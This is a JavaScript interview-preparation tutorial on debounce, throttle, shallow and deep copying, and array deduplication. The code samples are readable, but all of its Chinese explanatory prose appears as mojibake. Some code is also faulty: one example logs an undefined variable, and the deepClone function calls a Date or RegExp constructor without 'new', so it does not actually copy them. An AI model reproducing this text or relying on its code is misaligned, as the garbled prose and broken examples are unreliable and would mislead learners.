æœå°‹æ¡†å’Œæœå°‹å»ºè­°åˆ—è¡¨ç‚ºä¾‹å­ã€‚ç•«é¢å¦‚ä¸‹ï¼Œæœ‰ä¸€å€‹æœå°‹æ¡†ï¼Œå’Œä¸€å€‹æœå°‹å»ºè­°åˆ—è¡¨ï¼Œä½¿ç”¨è€…åœ¨æ­¤æœå°‹æ¡†è¼¸å…¥æ–‡å­—å¾Œï¼Œæœå°‹å»ºè­°åˆ—è¡¨æœƒå³æ™‚å‘ˆç¾çµæœ; æœå°‹æ¡†çš„æ–‡å­—åªè¦ä¸€æ”¹è®Šï¼Œæœå°‹å»ºè­°åˆ—è¡¨ä¹Ÿæœƒå³æ™‚æ›´æ–°çµæœã€‚\né€™æ¨£çœ‹èµ·ä¾†æ˜¯å¾ˆç†æƒ³çš„è¨­è¨ˆå§ï¼Ÿä½†é¦–å…ˆè¦å»è§£æ±ºä¸€å€‹å•é¡Œï¼šå¦‚æœä½¿ç”¨è€…ä¸€ç›´åœ¨æœå°‹æ¡†å…§æ›¸å¯«æ–‡å­—ï¼Œé€™æ¨£æœƒä¸€ç›´è§¸ç™¼ API å»æ›´æ–°æœå°‹å»ºè­°åˆ—è¡¨ï¼Œä¾‹å¦‚ä½¿ç”¨è€…æƒ³æœå°‹ javascriptï¼Œé€™æ™‚ API ä¹ŸåŠæ™‚è§¸ç™¼ï¼Œæ‰€ä»¥æ­¤ API æœƒè¢«è§¸ç™¼ 10 æ¬¡ï¼Œè€Œä¸”å‰ 9 æ¬¡ä¸æœƒæ˜¯ä½¿ç”¨é€™æƒ³è¦çš„çµæœã€‚\nç‚ºäº†æå‡ä½¿ç”¨è€…é«”é©—ä»¥åŠå„ªåŒ–ç¨‹å¼å—ï¼Œé€™ä¸€æ®µåŠŸèƒ½æˆ‘å€‘å°±å¯ä»¥é€é**é˜²æŠ–(debounce)**ä¾†å„ªåŒ–ã€‚\né˜²æŠ–å‡½å¼æœƒæ¥å—å…©å€‹åƒæ•¸ï¼š\nå»¶é²çš„æ™‚é–“(ms) è¦åŸ·è¡Œçš„å‡½å¼ ä»¥ä¸Šé¢æœå°‹æ¡†çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘é€éé˜²æŠ–å°±å¯ä»¥å®Œæˆï¼šç•¶ä½¿ç”¨è€…åœæ­¢åœ¨æœå°‹æ¡†å…§æ‰“å…¥æ–‡å­—è¶…éä¸€å®šçš„æ™‚é–“ï¼Œæ­¤æ™‚æ‰æœƒå»åŸ·è¡Œè§¸ç™¼ API çš„å‡½å¼ã€‚\nå¦‚ä½•å¯¦ç¾é˜²æŠ–å‡½å¼(debounce) æˆ‘å€‘å…ˆç›´æ¥çœ‹ç¨‹å¼ç¢¼ï¼Œçœ‹çœ‹ä½ èƒ½äº†è§£å¤šå°‘ã€‚æœ‰ä¸æ‡‚çš„åœ°æ–¹ä¹Ÿä¸æ“”å¿ƒï¼Œä¸‹é¢æœƒé€éè¨»è§£ï¼Œä¸€è¡Œè¡Œè§£é‡‹ï¼š\n1 2 3 4 5 6 7 8 9 10 function debounce(fn, delay = 500) { let timer; return (...args) =\u0026gt; { clearTimeout(timer); timer = setTimeout(() =\u0026gt; { fn(...args); }, delay); }; } ç¨‹å¼ç¢¼è¨»è§£ç‰ˆæœ¬å’Œå¯¦éš›æ‡‰ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // debounce function æ¥å—å…©å€‹åƒæ•¸ // ä¸€æ˜¯ï¼šè¦åŸ·è¡Œçš„ function // äºŒæ˜¯ï¼šè¦å»¶é²çš„è±ªç§’æ•¸ï¼Œé€™é‚Šé è¨­ 500 æ¯«ç§’ function debounce(fn, delay = 500) { let timer; // debounce function æœ€çµ‚æœƒå›å‚³ä¸€å€‹ function return (...args) =\u0026gt; { // æ¯ä¸€æ¬¡ debounce function è¢«è§¸ç™¼æ™‚ï¼Œæœƒå…ˆæ¸…é™¤ä¹‹å‰çš„ timerï¼Œé¿å…è§¸ç™¼å…ˆå‰çš„ fn å‡½å¼ // å› æ­¤åªè¦åœ¨ delay æ™‚é–“å…§è§¸ç™¼ debounce functionï¼Œå°±æœƒä¸€ç›´æ¸…é™¤å…ˆå‰çš„ timerï¼Œé¿å… fn ä¸€ç›´è¢«åŸ·è¡Œ clearTimeout(timer); // æ¸…é™¤ä¹‹å¾Œï¼Œå†é‡æ–°è¨ˆæ™‚ // ç•¶ delay æ™‚é–“åˆ°æ™‚ï¼ŒåŸ·è¡Œ fn timer = setTimeout(() =\u0026gt; { fn(...args); }, delay); }; } // updateDebounceText æœƒåœ¨å»¶é² 500 ms å¾ŒåŸ·è¡Œ console.log(\u0026#39;call api get search result\u0026#39;) const updateDebounceText = debounce((text) =\u0026gt; { console.log(\u0026#39;call api get search result\u0026#39;); }, 500); // æœå°‹æ¡†ç›£è½ input äº‹ä»¶ï¼Œç•¶ input æ”¹è®Šæ™‚ // è§¸ç™¼ updateDebounceText å‡½å¼ searchInput.addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { updateDebounceText(e.target.value); }); ç¯€æµå‡½å¼(throttle) ç¯€æµ(throttle)åœ¨åšä»€éº¼ï¼Ÿ **ç¯€æµ(throttle)**æŒ‡çš„æ˜¯ï¼Œåœ¨ä¸€æ®µæ™‚é–“å…§åªæœƒåŸ·è¡Œä¸€æ¬¡è§¸ç™¼äº‹ä»¶çš„å›èª¿å‡½å¼(callback)ï¼Œè‹¥åœ¨é€™ä¹‹ä¸­åˆæœ‰æ–°äº‹ä»¶è§¸ç™¼ï¼Œå‰‡ä¸åŸ·è¡Œæ­¤å›èª¿å‡½å¼ã€‚\nåœ¨æ‰‹å¯«**ç¯€æµå‡½å¼(throttle)**å‰ï¼Œæˆ‘å€‘å…ˆä¾†äº†è§£ç¯€æµçš„ä½¿ç”¨æƒ…å¢ƒã€‚\nç›£è½æ»¾å‹•äº‹ä»¶ï¼Œæ˜¯æ­é…ç¯€æµçš„ä½¿ç”¨å ´æ™¯ä¹‹ä¸€ã€‚èˆ‰ä¾‹ä¾†èªªï¼šè¦åˆ¤æ–·ä½¿ç”¨è€…æ˜¯å¦å·²ç¶“æ»‘å‹•åˆ°é é¢çš„ 30% è™•ï¼Œç•¶åˆ°é”æ™‚æœƒè§¸ç™¼ä¸€äº›å‹•ç•«æ•ˆæœï¼Œå› æ­¤æœƒé€éç›£è½æ»¾å‹•äº‹ä»¶æ™‚ï¼Œè¨ˆç®—æ˜¯å¦å·²åˆ°é”è©²ä½ç½®ï¼Œä½†å¦‚æœåªè¦ä¸€æ»¾å‹•å°±è¨ˆç®—æœƒéå¸¸æ¶ˆè€—æ€§èƒ½ï¼Œé€é**ç¯€æµ(throttle)**å¯ä»¥å°‡è¨ˆç®—çš„é€™å€‹å›èª¿å‡½å¼åœ¨å›ºå®šæ™‚é–“å…§åˆä½µä¸€æ¬¡è¢«åŸ·è¡Œã€‚\né€™è£¡ä¸é©åˆä½¿ç”¨é˜²æŠ–çš„åŸå› æ˜¯ï¼Œé˜²æŠ–åªæœƒåœ¨äº‹ä»¶åœæ­¢è¢«è§¸ç™¼å¾Œçš„ä¸€æ®µæ™‚é–“å…§è¢«åŸ·è¡Œä¸€æ¬¡ã€‚å› æ­¤å¦‚æœç”¨é˜²æŠ–ï¼Œç•¶ä½¿ç”¨è€…ä¸€ç›´æ»‘å‹•é é¢ï¼Œå‡½å¼å°±æ°¸é ä¸æœƒè¢«è§¸ç™¼ã€‚é€™é‚Šæˆ‘å€‘ä»æƒ³è¦å‡½å¼åœ¨æ»‘å‹•éç¨‹ä¸­è¢«è§¸ç™¼ï¼Œåªæ˜¯ä¸æƒ³é‚£éº¼é »ç¹è¢«è§¸ç™¼ï¼Œé€™ç¨®æƒ…å¢ƒä¸‹ï¼Œç¯€æµå°±å¯ä»¥æ´¾ä¸Šç”¨å ´ã€‚\n**ç¯€æµå‡½å¼(throttle)**æœƒæ¥å—å…©å€‹åƒæ•¸ï¼š\nå»¶é²çš„æ™‚é–“(ms) è¦åŸ·è¡Œçš„å›èª¿å‡½å¼(callback) å¦‚ä½•å¯¦ç¾ç¯€æµå‡½å¼(throttle) æˆ‘å€‘å…ˆç›´æ¥çœ‹ç¨‹å¼ç¢¼ï¼Œçœ‹çœ‹ä½ èƒ½äº†è§£å¤šå°‘ã€‚æœ‰ä¸æ‡‚çš„åœ°æ–¹ä¹Ÿä¸æ“”å¿ƒï¼Œä¸‹é¢æœƒé€éè¨»è§£ï¼Œä¸€è¡Œè¡Œè§£é‡‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 function throttle(fn, delay = 500) { let timer = null; return (...args) =\u0026gt; { if (timer) return; timer = setTimeout(() =\u0026gt; { fn(...args); timer = null; }, delay); }; } ç¨‹å¼ç¢¼è¨»è§£ç‰ˆæœ¬å’Œå¯¦éš›æ‡‰ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function throttle(fn, delay = 500) { let timer = null; // throttle æœ¬èº«æœƒå›å‚³ä¸€å€‹å‡½å¼ï¼Œé€é ...args æ‹¿åˆ°è©²å‡½å¼çš„å¼•æ•¸ return (...args) =\u0026gt; { // å¦‚æœæœ‰è¨ˆæ™‚å™¨ï¼Œè¡¨ç¤ºé‚„åœ¨ delay çš„ç§’æ•¸å…§ // ç›´æ¥ returnï¼Œä¸å¾€ä¸‹åŸ·è¡Œç¨‹å¼ç¢¼ if (timer) return; // å¦‚æœè¨ˆæ™‚å™¨ä¸ç­‰æ–¼ nullï¼Œæœƒé€²åˆ°ä»¥ä¸‹é‚è¼¯ // è¨­å®šè¨ˆæ™‚å™¨ï¼Œåœ¨ delay ç§’æ•¸ä¹‹å¾Œï¼ŒæœƒåŸ·è¡Œå›èª¿å‡½å¼ fnï¼Œä¸¦å°‡è¨ˆæ™‚å™¨å€¼ç‚ºæ”¹ç‚º null // å¦‚æœé‚„ä¸åˆ° delay çš„ç§’æ•¸ï¼Œå‰‡ timer çš„å€¼ä¸ç‚º nullï¼Œä¸æœƒé€²åˆ°é€™æ®µé‚è¼¯ // å¯ä»¥é”åˆ° throttle çš„ç›®çš„ï¼Œå°‡ä¸€æ®µæ™‚é–“å…§çš„æ“ä½œï¼Œé›†åˆæˆä¸€æ¬¡åŸ·è¡Œ timer = setTimeout(() =\u0026gt; { fn(...args); timer = null; }, delay); }; } const updateThrottleText = throttle(() =\u0026gt; { console.log(\u0026#39;throttle\u0026#39;); }, 500); // å¦‚æœä¸€ç›´æ»‘å‹•ç•«é¢ï¼Œæœƒå›ºå®š 500ms console.log(\u0026#39;throttle\u0026#39;) window.addEventListener(\u0026#39;scroll\u0026#39;, () =\u0026gt; { updateThrottleText(); }); æ·ºæ‹·è²(shallow copy)èˆ‡æ·±æ‹·è²(deep copy) åœ¨ JavaScript è¤‡è£½å€¼æ™‚ï¼Œç•¶è¤‡è£½çš„æ˜¯é**åŸå§‹å‹åˆ¥(primitive type)**çš„è³‡æ–™å‹åˆ¥æ™‚ï¼Œä¾‹å¦‚ï¼šç‰©ä»¶(object)ã€**æ•¸çµ„(array)**ç­‰ï¼Œæœƒé‡åˆ°æ·ºæ‹·è²(shallow copy)å’Œæ·±æ‹·è²(deep copy)çš„å·®ç•°ã€‚åœ¨é¢è©¦æ™‚è¢«å•åˆ°é€™å…©è€…çš„å·®ç•°ï¼Œä½ æœƒæ€éº¼å›ç­”ï¼Ÿå¦‚æœè¦ä½ ç•¶å ´æ‰‹å¯«æ·±æ‹·è²ï¼Œä½ æœƒæ€éº¼å¯«ï¼Ÿ\næ¯”è¼ƒæ·ºæ‹·è²(shallow copy) å’Œæ·±æ‹·è²(deep copy) æ·ºæ‹·è²æ˜¯æŒ‡è¤‡è£½å€¼æ™‚ï¼ŒåŸæœ¬çš„è®Šæ•¸å’Œæ–°çš„è®Šæ•¸æœƒæŒ‡å‘åŒä¸€å€‹å€(reference)ï¼Œæ›å¥è©±èªªï¼Œå¦‚æœæ‹·è²çš„ç‰©ä»¶å…§å®¹æœ‰æ”¹è®Šï¼ŒåŸæœ¬çš„ç‰©ä»¶ä¹Ÿæœƒè¢«æ”¹è®Šã€‚\nä»¥ä¸‹ç¨‹å¼ç¢¼æ˜¯ä¸€å€‹ç°¡å–®çš„ä¾‹å­ã€‚\nå®šç¾©ä¸€å€‹æ–°è®Šæ•¸ objBï¼Œä¸¦å°‡å…¶å€¼è³¦äºˆç‚º objAï¼Œæ­¤æ™‚æ”¹è®Š objB ä¹ŸæœƒåŒæ™‚æ”¹è®Š objAï¼Œå› ç‚ºé€™å…©å€‹è®Šæ•¸æ˜¯å…±äº«åŒä¸€å€‹å€(reference)ã€‚\n1 2 3 4 5 6 7 8 9 10 11 let objA = { a: 1, b: 2, }; let objB = objA; objB.a = 3; // å› ç‚ºæ˜¯æ·ºæ‹·è²ï¼ŒobjA çš„ a ä¹Ÿæœƒè¢«æ”¹è®Š console.log(objA); //{a:3, b:2} console.log(objB); //{a:3, b:2} ç›¸ååœ°ï¼Œæ·±æ‹·è²æ˜¯æŒ‡åœ¨æ‹·è²æ™‚ä¸å…±äº«ç›¸åŒçš„å€(reference)ã€‚\nä»¥ä¸Šé¢çš„ä¾‹å­ï¼Œå¦‚æœ objB æ˜¯é€éæ·±æ‹·è²å‰µå»ºå‡ºä¾†ï¼Œç•¶æˆ‘å€‘åœ¨æ›´æ”¹ objB çš„å€¼æ™‚ï¼Œä¸¦ä¸ç”¨æ“”å¿ƒ objA çš„å€¼æœƒåŒæ¨£è¢«æ›´å‹•åˆ°ã€‚\nè£œå……èªªæ˜ï¼Œåœ¨æ‹·è²å€¼æ™‚ï¼Œæœ‰å¯èƒ½æœƒé‡åˆ°è®Šæ•¸æ˜¯å¤šå±¤çš„æƒ…å¢ƒï¼Œä¾‹å¦‚æ˜¯ä¸€å€‹ç‰©ä»¶è£¡é‚„æœ‰ç‰©ä»¶ï¼Œæ·±æ‹·è²çš„å®šç¾©æœƒæ˜¯æ¯ä¸€å±¤çš„å€¼éƒ½ä¸æœƒå…±äº«å€(reference)ã€‚ä»¥ lodash é€™å€‹å¥—ä»¶æä¾›çš„æ•ˆç”¨å‡½å¼èˆ‰ä¾‹ï¼Œä¹Ÿæ˜¯åˆ†æˆ clone å’Œ cloneDeep å…©ç¨®ä¸åŒæ•ˆç”¨å‡½å¼ï¼Œclone åªç”¨æ–¼æ·ºæ‹·è²(ç¬¬ä¸€å±¤æ‹·è²)ï¼Œä½† cloneDeep å¯ç”¨æ–¼æ·±æ‹·è²ã€‚\n1 2 3 4 5 6 7 8 9 10 11 // lodash çš„æ·ºæ‹·è² clone var objects = [{ a: 1 }, { b: 2 }]; var shallow = _.clone(objects); console.log(objects === shallow); // false console.log(shallow[0] === objects[0]); // true // lodash çš„æ·±æ‹·è² cloneDeep var objects = [{ a: 1 }, { b: 2 }]; var deep = _.cloneDeep(objects); console.log(objects === deep); // false console.log(deep[0] === objects[0]); // false åœ¨èªªæ˜å®Œæ·ºæ‹·è²èˆ‡æ·±æ‹·è²çš„å·®åˆ¥å¾Œï¼Œå¸¸è¦‹çš„æ¥çºŒå•é¡Œæ˜¯ã€Œæ‰‹å¯«ã€æ·ºæ‹·è²èˆ‡æ·±æ‹·è²ã€‚\nå‡å¦‚ä½ ä¸ç¢ºå®šæ€éº¼æ‰‹å¯«é€™å…©ç¨®æ‹·è²æ–¹å¼ï¼Œå¯ä»¥ç¹¼çºŒå¾€ä¸‹çœ‹ã€‚\nå¦‚ä½•å¯¦ç¾æ·ºæ‹·è²(shallow copy) æ–¹æ³•ä¸€ï¼šæ‰‹å‹•è¤‡è£½å€¼ 1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = { a: objA.a, b: objA.b }; console.log(objA === objB); // false console.log(objA.b === objB.b); // true, ç¬¬äºŒå±¤çš„ç‰©ä»¶é‚„æ˜¯æŒ‡å‘ç›¸åŒä½ç½® æ–¹æ³•äºŒï¼šä½¿ç”¨ spread syntax 1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = { ...objA }; console.log(objA === objB); // false console.log(objA.b === objB.b); // true, ç¬¬äºŒå±¤çš„ç‰©ä»¶é‚„æ˜¯æŒ‡å‘ç›¸åŒä½ç½® æ–¹æ³•ä¸‰ï¼šä½¿ç”¨ Object.assign 1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = Object.assign({}, objA); console.log(objA === objB); // false console.log(objA.b === objB.b); // true, ç¬¬äºŒå±¤çš„ç‰©ä»¶é‚„æ˜¯æŒ‡å‘ç›¸åŒä½ç½® å¦‚ä½•å¯¦ç¾æ·±æ‹·è²(deep copy) æ–¹æ³•ä¸€ï¼šä½¿ç”¨ JSON.parse(JSON.stringify(...)) é€™å€‹ä½œæ³•æ˜¯å…ˆå°‡ç‰©ä»¶ç”¨ JSON.stringify åºåˆ—åŒ–ç‚º stringï¼Œå†é€é JSON.parse ååºåˆ—åŒ–è½‰æ›å›ç‰©ä»¶ã€‚\nè¦ç‰¹åˆ¥æ³¨æ„ï¼Œé€™åšæ³•åªèƒ½ç”¨æ–¼å¯åºåˆ—åŒ–çš„ç‰©ä»¶ï¼Œæœ‰äº›ç„¡æ³•åºåˆ—åŒ–çš„ç‰©ä»¶ä¾‹å¦‚ï¼šfunctionã€HTML çš„å…ƒç´ ï¼Œé€™äº›æ˜¯ç„¡æ³•åºåˆ—åŒ–çš„ï¼æ‰€ä»¥åŸ·è¡Œå‰ï¼Œéœ€è¦å…ˆç¢ºèªæ˜¯å¦å¯ä»¥åºåˆ—åŒ–ï¼Œå¦å‰‡åœ¨åŸ·è¡Œ JSON.stringify æ™‚æœƒå¤±æ•—ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 let objA = { a: 1, b: { c: 3 }, }; function deepCopy(item) { return JSON.parse(JSON.stringify(item)); } let objB = deepCopy(objA); console.log(objA === objB); // false console.log(objA.b === objB.b); // false æ–¹æ³•äºŒï¼šä½¿ç”¨ structuredClone(value) é‡å°å¯åºåˆ—åŒ–çš„ç‰©ä»¶ï¼Œæœ‰å¦å¤–ä¸€ç¨®é€é JavaScript å…§å»ºçš„æ–¹æ³•é”æˆæ·±æ‹·è²ã€‚é€™ç¨®æ–¹æ³•æ˜¯ structuredClone(value)ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 let objA = { a: 1, b: { c: 3 }, }; let objB = structuredClone(objA); console.log(objA === objB); // false console.log(objA.b === objB.b); // false æ–¹æ³•ä¸‰ï¼šè€ƒæ…®å¤šé‡æƒ…æ³çš„éè¿´å¼æ·±æ‹·è² é€šå¸¸åœ¨é¢è©¦ä¸­ï¼Œç”¨ä¸Šè¿°å…©ç¨®æ–¹å¼ï¼Œå¯èƒ½æœƒè¢«é¢è©¦å®˜è¿½å•èªªï¼Œå¦‚æœä¸ç”¨é€™ç¨®ç¾æˆçš„æ–¹æ³•ï¼Œè¦å¦‚ä½•æ‰‹å¯«ï¼Ÿ\nä»¥ä¸‹çš„å¯«æ³•æ˜¯é€ééè¿´çš„æ–¹å¼ï¼Œä¾†é€²è¡Œæ·±æ‹·è²ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function deepClone(obj) { // ç¢ºèªæ˜¯ä¸æ˜¯åŸå§‹å‹æ…‹ï¼Œå¦‚æœæ˜¯çš„è©±å°±ç›´æ¥å›å‚³ if (obj === null || typeof obj !== \u0026#39;object\u0026#39;) { return obj; } // ç¢ºèªæ˜¯ä¸æ˜¯ Date æˆ– RegExp é€™ç¨®ç‰¹æ®Šå‹æ…‹ï¼Œæ˜¯çš„è©±å°±é€éå»ºæ§‹å¼è¤‡è£½ä¸€å€‹ç›¸åŒçš„å€¼ï¼Œç„¶å¾Œå›å‚³ if (obj instanceof Date || obj instanceof RegExp) return obj.constructor(obj); // çœ‹ obj æ˜¯ç‰©ä»¶é‚„æ˜¯é™£åˆ—ï¼Œç„¶å¾Œå…ˆå»ºä¸€å€‹æ–°çš„ç©ºç‰©ä»¶ (æˆ–ç©ºé™£åˆ—) let result = Array.isArray(obj) ? [] : {}; // é€é Ojbect.entries ä¾†è¿­ä»£ï¼Œç„¶å¾Œéè¿´åœ°å°æ¯å€‹å€¼æ·±æ‹·è² // å› ç‚º Object.entries ä¸æœƒåˆ—èˆ‰æ•´å€‹åŸå‹éŠ (prototype chain) // æ‰€ä»¥ä¸ç”¨é€é obj.hasOwnProperty(key) é¡å¤–æª¢æŸ¥æ˜¯ä¸æ˜¯éåŸå‹éˆä¸Šçš„å±¬æ€§ for (const [key, value] of Object.entries(obj)) { result[key] = deepClone(value); } // æœ€å¾Œå›å‚³çµæœ return result; } é™£åˆ—å»é™¤é‡è¤‡(remove duplicates)æ–¹æ³• åœ¨é™£åˆ—ä¸­æŠŠé‡è¤‡çš„é …ç›®å»é™¤æ‰ï¼Œæ˜¯å¾ˆå¸¸åœ¨å¯¦éš›å·¥ä½œä¸­éœ€è¦åŸ·è¡Œçš„æ“ä½œã€‚å› æ­¤åœ¨ JavaScript é¢è©¦æ™‚ï¼Œä¹Ÿå¾ˆå¸¸æœƒè¢«å•ã€‚é€™ç¨®é¡Œç›®é€šå¸¸æœƒè¦ç•¶å ´æ‰‹å¯«ï¼Œæ‰€ä»¥å‡å¦‚ä½ ä¸å¤ªç¢ºå®šè¦æ€éº¼æ‰‹å¯«å»é™¤é‡è¤‡ï¼Œä¸€å®šè¦åœ¨é¢è©¦å‰å¤šç·´ç¿’å¹¾æ¬¡ã€‚\né™£åˆ—å»é™¤é‡è¤‡é¡Œç›®é•·ä»€éº¼æ¨£ï¼Ÿ é™£åˆ—å»é™¤é‡è¤‡çš„é¢è©¦é¡Œï¼Œé€šå¸¸æœƒåƒä¸‹é¢é€™æ¨£ï¼Œçµ¦ä¸€å€‹é™£åˆ—ï¼Œè£¡é¢æœ‰é‡è¤‡çš„æ•¸å­—ï¼Œä¸¦è¦æ±‚å¯«ä¸€å€‹ removeDuplicate å‡½å¼ï¼Œè¼¸å…¥æ˜¯åŸå§‹é™£åˆ—ï¼Œè¼¸å‡ºæ˜¯å»é™¤é‡è¤‡æ•¸å­—çš„é™£åˆ—ã€‚\n1 2 3 4 5 6 7 8 const originalArr = [9, 1, 2, 2, 3, 4, 2, 4, 8, 1, 9] function removeDuplicate(array){ // ... } const ans = removeDuplicate(originalArr); console.log(ans) // [9, 1, 2, 3, 4, 8] é™£åˆ—å»é‡è¤‡å…¶å¯¦æœ‰å¾ˆå¤šç¨®åšæ³•ï¼Œä»¥ä¸‹æœƒåˆ—å‡º 4 ç¨®å¸¸è¦‹åšæ³•ã€‚åœ¨é¢è©¦è€ƒæ‰‹å¯«é¡Œæ™‚ï¼Œé™£åˆ—å»é‡è¤‡æœ‰å¯èƒ½æ˜¯å–®ç¨ä¸€ç¨®é¡Œå‹ï¼Œæˆ–è€…æ˜¯åœ¨è§£æ‰‹å¯«é¡Œæ™‚ä¸€é–‹å§‹éœ€è¦å°‡é™£åˆ—é€²è¡Œå»é‡è¤‡çš„æ“ä½œã€‚\nå»ºè­°è©¢å•é¢è©¦å®˜é¡Œç›®çš„éœ€æ±‚ã€ä¸»å‹•è·Ÿé¢è©¦å®˜è¨è«–æœŸæœ›çš„è§£æ³•ï¼Œå†é¸æ“‡è¦ä½¿ç”¨å“ªä¸€ç¨®è§£æ³•ã€‚\nå››ç¨®è§£æ³• è§£æ³•ä¸€ï¼šä½¿ç”¨ Set å»é‡è¤‡ Set çš„è³‡æ–™æ ¼å¼èˆ‡ç”¨æ³•é¡ä¼¼æ–¼ Arrayï¼Œä½†æœ‰ä¸€ç‰¹è‰²æ˜¯ Set ä¸­åªèƒ½å„²å­˜ä»»ä½•è³‡æ–™çš„å”¯ä¸€å€¼ï¼Œå› æ­¤å¯ä»¥å…ˆå°‡ Array è½‰ç‚º Setï¼Œæ­¤æ™‚é‡è¤‡çš„å€¼æœƒè¢«ç§»é™¤ï¼Œå†å°‡ Set è½‰ç‚º Arrayã€‚ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 function removeDuplicate(arr) { return Array.from(new Set(arr)); } // ä¹Ÿå¯ä»¥åˆ©ç”¨ spread syntax æ›´ç°¡åŒ–ç¨‹å¼ç¢¼ // function removeDuplicate(arr) { // return [...new Set(arr)]; // } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arr1After); // [1, 2, 3, 8] è§£æ³•äºŒï¼š filter æ­é… indexOf æ­¤è§£æ³•å…ˆç”¨ array çš„ filter æ–¹æ³•ï¼Œæ­é… indexOf æ–¹æ³•ï¼Œåªä¿ç•™ç¬¬ä¸€æ¬¡å‡ºç¾çš„å€¼ï¼Œæ‰€ä»¥åªè¦æ˜¯ç¬¬äºŒæ¬¡å‡ºç¾çš„ï¼Œå°±æœƒè¢«ç¯©æ‰ï¼Œé€™èƒ½ç¢ºä¿çµæœä¸æœƒæœ‰é‡è¤‡çš„ã€‚ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 function removeDuplicate(arr) { // indexOf æœƒå›å‚³åœ¨é€™å€‹ array ç­‰åŒæ–¼æ­¤å€¼ç¬¬ä¸€å€‹ item çš„ indexï¼Œ // æ‰€ä»¥å¦‚æœ indexOf å›å‚³çš„ index ç›¸ç­‰æ–¼ç›®å‰ filter åˆ°çš„å€¼ï¼Œ // å‰‡ä»£è¡¨è©²å€¼æ˜¯ç¬¬ä¸€æ¬¡å‡ºç¾ï¼Œæˆ‘å€‘ä¿ç•™èµ·ä¾†ï¼Œ // åä¹‹ï¼Œå¦‚æœ index ä¸ç­‰æ–¼ï¼Œå‰‡ä»£è¡¨æ­¤ array ä¸­å‰é¢ä½ç½®å·²ç¶“å‡ºç¾éï¼Œæ‰€ä»¥å°± filter æ‰ã€‚ return arr.filter((item, index, array) =\u0026gt; array.indexOf(item) === index); } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arrAfter); // [1, 2, 3, 8] è§£æ³•ä¸‰ï¼š é›™å±¤ for loop é›™å±¤ for loop æ˜¯ä¸€ç¨®æš´åŠ›è§£ã€‚ä¾åºéæ­·æ•´å€‹ arrayï¼Œå†é€éç¬¬äºŒå±¤ for loop æ‰¾å‡ºé‡è¤‡çš„å€¼å°‡å…¶ç§»é™¤ã€‚ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function removeDuplicate(arr) { // ç¬¬ä¸€å±¤ for loopï¼Œi å¾ index 0 é–‹å§‹ï¼Œåˆ° arr æœ€å¾Œ for (let i = 0, len = arr.length; i \u0026lt; len; i++) { // ç¬¬äºŒå±¤ for loopï¼Œj å¾ i + 1 é–‹å§‹ï¼Œè¦æª¢æŸ¥å€¼æ˜¯å¦é‡è¤‡ for (let j = i + 1; j \u0026lt; len; j++) { // å¦‚æœå€¼é‡è¤‡ï¼Œå‰‡é€é splice æ–¹æ³•å°‡ j ä½ç½®çš„å€¼å¾ arr å»é™¤ if (arr[i] == arr[j]) { arr.splice(j, 1); // ç§»é™¤é‡è¤‡çš„å€¼ä¹‹å¾Œï¼Œarr length é•·åº¦æœƒéœ€è¦æ¸› 1 len--; // j ä½ç½®çš„å€¼è¢«ç§»é™¤ï¼Œå› æ­¤ j index ä¹Ÿè¦æ¸› 1 j--; } } } return arr; } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arrAfter); // [1, 2, 3, 8] è§£æ³•å››ï¼š é€é object æˆ– Map å„²å­˜ä»¥éæ­·éçš„é …ç›® æˆ‘å€‘å¯ä»¥é€é object æˆ– Map ä¾†å„²å­˜å·²ç¶“éæ­·éçš„é …ç›®ï¼Œä¾†æ‰¾å‡ºæ˜¯å¦å·²å­˜åœ¨é™£åˆ—ç•¶ä¸­ï¼Œå¦‚æœé‚„ä¸åœ¨ï¼Œé‚£å°±æ”¾é€²è¦è¼¸å‡ºçš„é™£åˆ—ï¼›å¦‚æœå·²ç¶“åœ¨äº†ï¼Œå°±ä¸å†æ”¾å…¥ï¼Œé€™æ¨£ä¸€ä¾†èƒ½ç¢ºä¿é™£åˆ—ä¸­æ²’æœ‰é‡è¤‡çš„å€¼ã€‚ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function removeDuplicate(arr) { let seen = {}; let newArray = []; // éæ­·éåŸæœ¬çš„é™£åˆ— for (let item of arr) { // åˆ¤æ–·ç•¶å‰è¢«éæ­·åˆ°çš„é …ç›®æ˜¯å¦å·²ç¶“æ”¾å…¥é if (seen[item] !== true) { newArray.push(item); // å¦‚æœé‚„æ²’ï¼Œå‰‡æ”¾å…¥è¦è¢«è¼¸å‡ºçš„æ–°é™£åˆ— seen[item] = true; // é€™æ™‚ç´€éŒ„ä¸€ä¸‹é€™å€‹é …ç›®å·²ç¶“è¢«æ”¾å…¥ï¼Œä¸‹æ¬¡å°±ä¸æœƒå†è¢«æ”¾å…¥ } } return newArray; } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arrAfter); // [1, 2, 3, 8] 